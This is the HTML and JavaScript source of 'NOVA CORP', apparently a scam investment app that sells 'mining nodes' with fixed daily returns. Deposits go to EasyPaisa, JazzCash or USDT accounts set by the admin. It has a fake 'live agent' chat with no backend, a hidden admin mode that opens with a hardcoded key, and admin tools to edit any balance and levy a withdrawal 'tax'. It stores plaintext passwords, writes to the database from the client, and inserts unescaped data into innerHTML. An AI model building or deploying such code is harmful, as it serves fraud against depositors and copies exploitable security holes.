<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | Official Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0F172A; }
        body { background: #F8FAFC; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        .premium-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.02); overflow: hidden; }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 14px; font-weight: 800; cursor: pointer; border: none; transition: 0.3s; }
        .btn-gold:active { transform: scale(0.95); }
        .screen { display: none; min-height: 100vh; width: 100%; padding-bottom: 100px; }
        .active-screen { display: block; animation: slideUp 0.4s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 15px 5px; z-index: 1000; border-radius: 20px 20px 0 0; }
        .nav-item { color: #94a3b8; font-size: 8px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; transition: 0.3s; }
        .nav-item.active { color: var(--gold); transform: translateY(-3px); }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; background-color: #00ff88; box-shadow: 0 0 8px #00ff88; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        input { border: 1px solid #e2e8f0 !important; outline: none !important; transition: 0.3s; }
        input:focus { border-color: var(--gold) !important; }
    </style>
</head>
<body>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white min-h-screen flex flex-col justify-center">
            <h1 class="text-6xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest mt-2">Global Asset Management</p>
            <div class="space-y-4 max-w-xs mx-auto w-full mt-10">
                <input type="text" id="u-id" placeholder="Username" class="w-full p-4 rounded-2xl shadow-sm">
                <input type="password" id="u-pw" placeholder="Password" class="w-full p-4 rounded-2xl shadow-sm">
                <button onclick="handleAuth()" class="w-full btn-gold py-4 uppercase text-xs tracking-widest">Login / Join</button>
                <p onclick="toggleAuth()" id="auth-btn-text" class="text-[10px] text-slate-400 font-bold uppercase cursor-pointer underline mt-4">Create New Account</p>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-[100] backdrop-blur-md bg-white/80">
            <h2 id="logo-main" class="font-black text-2xl tracking-tighter cursor-pointer select-none">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="text-right">
                <p id="user-display" class="text-[10px] font-black uppercase text-slate-900">@USER</p>
                <div class="flex items-center gap-1 justify-end">
                    <div class="status-dot"></div>
                    <p class="text-[7px] font-black text-green-500 uppercase">Secure Link</p>
                </div>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="bg-slate-900 rounded-[35px] p-8 mb-6 text-white shadow-2xl relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-40 h-40 bg-white/5 rounded-full"></div>
                <p class="text-[9px] text-slate-400 font-bold uppercase tracking-widest mb-1">Available Liquidity</p>
                <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-10">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-8">
                    <div><p class="text-[8px] text-slate-500 font-bold uppercase">Today's Yield</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-slate-500 font-bold uppercase">Total Profit</p><p id="b-total" class="text-xl font-black text-gold">$0.00</p></div>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="premium-card p-6 flex flex-col items-center gap-2 border-b-4 border-b-gold"><i class="fa-solid fa-circle-plus text-gold text-2xl"></i><span class="text-[10px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-6 flex flex-col items-center gap-2 border-b-4 border-b-slate-200"><i class="fa-solid fa-wallet text-slate-400 text-2xl"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6">
            <h3 class="font-black text-xl mb-6 italic uppercase px-2">Industrial Hardware</h3>
            <div id="nodes-grid" class="space-y-4"></div>
        </div>

        <div id="page-chat" class="screen px-4 pt-6">
            <div class="premium-card flex flex-col h-[75vh]">
                <div class="p-4 border-b flex justify-between items-center bg-slate-50">
                    <div class="flex items-center gap-3">
                        <div class="status-dot"></div>
                        <span id="agent-display" class="text-[10px] font-black uppercase text-slate-600 tracking-wider">Live Agent</span>
                    </div>
                    <button id="admin-clear-chat" onclick="clearChat()" class="text-[9px] font-bold text-red-500 uppercase px-3 py-1 border border-red-200 rounded-lg" style="display:none;">Clear Session</button>
                </div>
                <div id="chat-box" class="flex-1 overflow-y-auto p-4 space-y-4 text-[12px]">
                    <div class="bg-slate-100 p-3 rounded-2xl max-w-[85%] font-medium">System encrypted. How can we assist your operations today?</div>
                </div>
                <div class="p-4 border-t bg-white">
                    <div class="flex gap-2 items-center bg-slate-50 p-2 rounded-2xl border">
                        <label class="cursor-pointer p-2 text-slate-400"><input type="file" id="chat-img" class="hidden" accept="image/*" onchange="handleImage(this)"><i class="fa-solid fa-camera"></i></label>
                        <input type="text" id="chat-input" placeholder="Secure message..." class="flex-1 bg-transparent border-none p-2 text-sm">
                        <button onclick="sendMsg()" class="btn-gold p-3 rounded-xl aspect-square flex items-center justify-center"><i class="fa-solid fa-paper-plane text-xs"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6">
            <h3 class="font-black text-xl mb-6 italic uppercase px-2">Transaction Logs</h3>
            <div id="logs-list" class="space-y-3"></div>
        </div>

        <div id="page-admin" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 text-red-600 uppercase italic">Command Center</h2>
            <div class="premium-card p-6 mb-6 bg-slate-900 text-white border-none shadow-xl">
                <h3 class="text-[10px] font-bold text-slate-500 uppercase mb-4 tracking-widest">Master Config</h3>
                <div class="space-y-3">
                    <input type="text" id="adm-ep" placeholder="EasyPaisa No" class="w-full p-4 rounded-xl text-black">
                    <input type="text" id="adm-jc" placeholder="JazzCash No" class="w-full p-4 rounded-xl text-black">
                    <input type="text" id="adm-usdt" placeholder="USDT Address" class="w-full p-4 rounded-xl text-black">
                    <div class="flex items-center gap-2 bg-slate-800 p-4 rounded-xl">
                        <span class="text-[10px] font-black uppercase text-slate-400">Withdraw Tax %</span>
                        <input type="number" id="adm-tax" class="w-20 bg-transparent text-white border-none text-right font-black" value="0">
                    </div>
                    <button onclick="saveAdminSettings()" class="w-full btn-gold py-4 text-xs shadow-lg shadow-gold/20">SAVE MASTER CONFIG</button>
                </div>
            </div>
            <div class="premium-card p-6 mb-6 shadow-xl">
                <h3 class="text-[10px] font-black uppercase mb-4 text-slate-400">Database Index</h3>
                <div id="adm-user-list" class="space-y-2 max-h-80 overflow-y-auto pt-2"></div>
            </div>
            <h3 class="text-[10px] font-bold uppercase mb-4 text-slate-400 px-2">Pending Requests</h3>
            <div id="adm-pending-list" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-house-chimney text-xl"></i><span>HOME</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-chat', this)" class="nav-item"><i class="fa-solid fa-headset text-xl"></i><span>SUPPORT</span></div>
            <div id="nav-hist" onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-receipt text-xl"></i><span>RECORDS</span></div>
            <div id="nav-admin-btn" onclick="nav('page-admin', this)" class="nav-item text-red-600" style="display: none;"><i class="fa-solid fa-user-shield text-xl"></i><span>ADMIN</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-red-400 text-xl"></i><span>EXIT</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-2xl uppercase">Recharge</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-circle-xmark text-2xl text-slate-300"></i></div>
        <div class="grid grid-cols-3 gap-2 mb-8">
            <button onclick="showWay('EP')" class="border-2 border-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase tracking-widest active:border-gold">EasyPaisa</button>
            <button onclick="showWay('JC')" class="border-2 border-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase tracking-widest active:border-gold">JazzCash</button>
            <button onclick="showWay('USDT')" class="border-2 border-slate-50 p-4 rounded-2xl text-[9px] font-black uppercase tracking-widest active:border-gold">USDT (BEP20)</button>
        </div>
        <div id="dep-info" class="bg-slate-900 p-8 rounded-[30px] text-center mb-8 hidden shadow-xl">
            <p class="text-slate-500 text-[8px] font-black uppercase mb-2 tracking-widest">Send Funds To:</p>
            <p id="dep-addr" class="text-white font-black text-lg break-all"></p>
        </div>
        <div class="space-y-4">
            <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="w-full p-5 rounded-2xl bg-slate-50 border-none font-bold">
            <input type="text" id="dep-txid" placeholder="Transaction ID (TRX)" class="w-full p-5 rounded-2xl bg-slate-50 border-none font-bold">
            <button onclick="handleFinance('Deposit')" class="w-full btn-gold py-5 shadow-xl shadow-gold/30 uppercase text-xs tracking-[0.2em]">Confirm Transaction</button>
        </div>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-8 hidden">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-2xl uppercase">Payout</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-circle-xmark text-2xl text-slate-300"></i></div>
        <div class="bg-blue-50 p-4 rounded-xl mb-6 text-[10px] font-bold text-blue-600 text-center uppercase tracking-widest" id="wd-tax-note">Tax: 0% will be applied</div>
        <div class="space-y-4">
            <input type="number" id="wd-amt" placeholder="Payout Amount ($)" class="w-full p-5 rounded-2xl bg-slate-50 border-none font-bold">
            <input type="text" id="wd-addr" placeholder="Wallet / Account Address" class="w-full p-5 rounded-2xl bg-slate-50 border-none font-bold">
            <button onclick="handleFinance('Withdraw')" class="w-full btn-gold py-5 uppercase text-xs tracking-widest">Request Withdrawal</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // 🔥 FIREBASE INITIALIZATION
        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);

        let user = localStorage.getItem('nova_session');
        let mode = 'login'; let admClicks = 0;
        let sys = { ep: "Not Set", jc: "Not Set", usdt: "Not Set", tax: 0 };

        // 💻 DYNAMIC INDUSTRIAL NODES
        const nodes = [{id:1, n:"Nano Micro Node", c:10, y:0.9}];
        for(let i=2; i<=21; i++) nodes.push({id:i, n:`Industrial Terminal V${i}`, c:15+(i*45), y:1.5+(i*4.2)});

        // 🔐 ADMIN GOD MODE ACCESS
        document.getElementById('logo-main').onclick = () => {
            admClicks++;
            if(admClicks >= 5) {
                if(prompt("Enter Terminal God Key:") === "nov786") {
                    document.getElementById('nav-admin-btn').style.display = "flex";
                    document.getElementById('admin-clear-chat').style.display = "block";
                    loadMasterUsers();
                    alert("GOD MODE: SYSTEM ACCESS GRANTED");
                }
                admClicks = 0;
            }
        };

        // 👤 AUTH SYSTEM
        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("All fields are mandatory");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(mode === 'login') {
                if(snap.exists() && snap.data().password === pw) {
                    localStorage.setItem('nova_session', id); location.reload();
                } else alert("Invalid Terminal Credentials");
            } else {
                if(snap.exists()) return alert("Operator ID already active");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [], status: 'Active' });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        // 💬 CHAT INFRASTRUCTURE
        const agents = ["Senior specialist", "Terminal Head", "Asset Manager"];
        document.getElementById('agent-display').innerText = agents[Math.floor(Math.random() * agents.length)];

        window.sendMsg = () => {
            const input = document.getElementById('chat-input');
            if(!input.value.trim()) return;
            addChatMsg(input.value, 'user');
            input.value = "";
        };

        window.handleImage = (input) => {
            if(input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = (e) => addChatImg(e.target.result, 'user');
                reader.readAsDataURL(input.files[0]);
            }
        };

        function addChatMsg(text, sender) {
            const box = document.getElementById('chat-box');
            const div = document.createElement('div');
            div.className = sender === 'user' ? 'bg-gold p-3 rounded-2xl max-w-[85%] ml-auto text-white font-medium shadow-sm' : 'bg-slate-100 p-3 rounded-2xl max-w-[85%] font-medium';
            div.innerText = text;
            box.appendChild(div);
            box.scrollTop = box.scrollHeight;
        }

        function addChatImg(src, sender) {
            const box = document.getElementById('chat-box');
            const div = document.createElement('div');
            div.className = sender === 'user' ? 'p-1 rounded-2xl max-w-[85%] ml-auto border-2 border-[#D4AF37] shadow-sm' : 'p-1 rounded-2xl max-w-[85%] border-2 border-slate-100 shadow-sm';
            div.innerHTML = `<img src="${src}" class="rounded-xl w-full">`;
            box.appendChild(div);
            box.scrollTop = box.scrollHeight;
        }

        window.clearChat = () => {
            document.getElementById('chat-box').innerHTML = '<div class="text-center text-[9px] text-slate-400 uppercase font-black py-10 tracking-[0.3em] opacity-50">SESSION REFRESHED</div>';
        };

        // 💰 FINANCIAL CORE
        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u) return;
                document.getElementById('user-display').innerText = `@${id}`;
                document.getElementById('b-main').innerText = `$${(u.balance || 0).toFixed(2)}`;
                document.getElementById('b-daily').innerText = `+$${(u.daily || 0).toFixed(2)}`;
                document.getElementById('b-total').innerText = `$${(u.total_profit || 0).toFixed(2)}`;
                renderNodes(u.active_nodes || []);
            });
            onSnapshot(doc(db, "config", "master"), d => { 
                if(d.exists()) {
                    sys = d.data(); 
                    document.getElementById('wd-tax-note').innerText = `Corporate Tax: ${sys.tax}% will be applied`;
                }
            });
            loadAdminReqs(); loadUserLogs(id);
        }

        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodes.forEach(n => {
                const isRun = active.find(a => a.nodeId === n.id);
                grid.innerHTML += `<div class="premium-card p-6 flex justify-between items-center transition-all hover:border-gold">
                    <div><h4 class="font-black text-xs uppercase text-slate-800">${n.n}</h4><p class="text-[9px] text-slate-400 font-bold uppercase tracking-tighter mt-1">$${n.c.toFixed(0)} • Return: $${n.y.toFixed(2)}/day</p></div>
                    ${isRun ? `<div class="flex items-center gap-2"><div class="status-dot"></div><span class="text-green-500 font-black text-[9px] uppercase tracking-widest">Mining</span></div>` : `<button onclick="buyNode(${n.id}, ${n.c}, ${n.y})" class="btn-gold px-7 py-2.5 text-[9px] uppercase tracking-widest shadow-lg shadow-gold/20">Buy</button>`}
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uRef = doc(db, "users", user); const snap = await getDoc(uRef);
            if(snap.data().balance < cost) return alert("Insufficient Terminal Liquidity");
            await updateDoc(uRef, { balance: snap.data().balance - cost, active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y }], daily: (snap.data().daily || 0) + y });
            alert("Terminal Hardware Successfully Deployed!");
        };

        window.showWay = (t) => {
            document.getElementById('dep-info').classList.remove('hidden');
            document.getElementById('dep-addr').innerText = (sys[t.toLowerCase()] || "Contact Support");
        };

        window.handleFinance = async (type) => {
            const amtInput = document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt');
            const refInput = document.getElementById(type === 'Deposit' ? 'dep-txid' : 'wd-addr');
            const amt = parseFloat(amtInput.value);
            const ref = refInput.value;
            if(!amt || !ref) return alert("Incomplete Protocol: Fill all fields");
            await addDoc(collection(db, "logs"), { user: user, type, amount: amt, ref, status: 'Pending', time: Date.now() });
            alert("Transmission Successful: Awaiting Approval");
            amtInput.value = ""; refInput.value = "";
            closeModal(type === 'Deposit' ? 'modal-dep' : 'modal-wd');
        };

        // 🛠️ ADMIN ENGINE
        async function loadMasterUsers() {
            const q = await getDocs(collection(db, "users"));
            const box = document.getElementById('adm-user-list'); box.innerHTML = "";
            q.forEach(uDoc => {
                const u = uDoc.data();
                box.innerHTML += `<div class="p-4 border rounded-2xl flex justify-between bg-slate-50 text-[10px] items-center">
                    <div><b class="text-slate-900">@${uDoc.id}</b><br><span class="text-slate-400">PW: ${u.password}</span></div>
                    <div class="text-right"><b class="text-gold">$${(u.balance || 0).toFixed(2)}</b><br><button onclick="editBal('${uDoc.id}')" class="text-blue-500 font-bold mr-2">Edit</button><button onclick="delUser('${uDoc.id}')" class="text-red-500 font-bold">Delete</button></div>
                </div>`;
            });
        }

        async function loadAdminReqs() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const list = document.getElementById('adm-pending-list'); list.innerHTML = "";
                s.forEach(ds => {
                    const l = ds.data();
                    list.innerHTML += `<div class="premium-card p-5 text-[10px] flex justify-between items-center bg-slate-50 border-none">
                        <div><b class="uppercase">${l.user}</b><br><span class="text-slate-500">$${l.amount} (${l.type})</span><br><span class="text-blue-500">${l.ref}</span></div>
                        <div class="flex gap-2">
                             <button onclick="approve('${ds.id}', '${l.user}', ${l.amount}, '${l.type}')" class="bg-green-500 text-white px-4 py-2 rounded-xl font-bold uppercase text-[8px]">Approve</button>
                             <button onclick="rejectReq('${ds.id}')" class="bg-red-500 text-white px-4 py-2 rounded-xl font-bold uppercase text-[8px]">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const s = await getDoc(uRef);
            if(type === 'Deposit') await updateDoc(uRef, { balance: (s.data().balance || 0) + amt });
            if(type === 'Withdraw') {
                const taxAmt = amt * (sys.tax / 100);
                const totalDeduct = amt + taxAmt;
                if(s.data().balance < totalDeduct) return alert("User has low balance for this payout");
                await updateDoc(uRef, { balance: (s.data().balance || 0) - totalDeduct });
            }
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
            alert("Action Verified!");
        };

        window.editBal = async (id) => {
            const nb = prompt("Enter New Balance for @" + id);
            if(nb !== null) await updateDoc(doc(db, "users", id), { balance: parseFloat(nb) });
            loadMasterUsers();
        };

        window.rejectReq = async (lid) => {
            await updateDoc(doc(db, "logs", lid), { status: 'Rejected' });
            alert("Request Refused");
        };

        window.saveAdminSettings = async () => {
            const up = { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, usdt: document.getElementById('adm-usdt').value, tax: parseFloat(document.getElementById('adm-tax').value) || 0 };
            await setDoc(doc(db, "config", "master"), up, { merge: true });
            alert("Master Configuration Synchronized!");
        };

        function loadUserLogs(id) {
            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const list = document.getElementById('logs-list'); list.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    list.innerHTML += `<div class="premium-card p-5 flex justify-between items-center text-[10px]">
                        <div><b class="uppercase text-slate-800">${l.type}</b><br><span class="text-slate-400">$${l.amount}</span></div>
                        <div class="${l.status==='Pending'?'text-orange-500':(l.status==='Rejected'?'text-red-500':'text-green-500')} font-black uppercase tracking-widest">${l.status}</div>
                    </div>`;
                });
            });
        }

        // 🔧 GLOBAL HELPERS
        window.delUser = async (id) => { if(confirm(`Confirm termination of @${id}?`)) await deleteDoc(doc(db, "users", id)); loadMasterUsers(); };
        window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
        window.openModal = (id) => { document.getElementById(id).classList.remove('hidden'); document.body.style.overflow = 'hidden'; };
        window.closeModal = (id) => { document.getElementById(id).classList.add('hidden'); document.body.style.overflow = 'auto'; };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleAuth = () => { mode = mode === 'login' ? 'reg' : 'login'; document.getElementById('auth-btn-text').innerText = mode === 'login' ? "Create Account" : "Login Instead"; };

        if(user) initApp(user);
    </script>
</body>
</html>
